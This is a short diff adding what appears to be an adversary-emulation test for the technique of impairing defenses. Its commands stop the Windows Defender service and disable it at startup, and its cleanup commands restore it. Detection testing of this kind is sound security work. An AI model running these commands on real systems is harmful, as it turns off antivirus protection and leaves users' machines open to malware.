@@ -1,0 +1,14 @@
+#TechniqueName: Impair Defenses: Disable or Modify Tools
+#AtomicTestName: Tamper with Windows Defender Command Prompt
+#Language: cmd
+
+#commands
+sc stop WinDefend
+sc config WinDefend start=disabled
+sc query WinDefend
+
+
+#cleanup_commands
+sc start WinDefend >nul 2>&1
+sc config WinDefend start=enabled >nul 2>&1
+
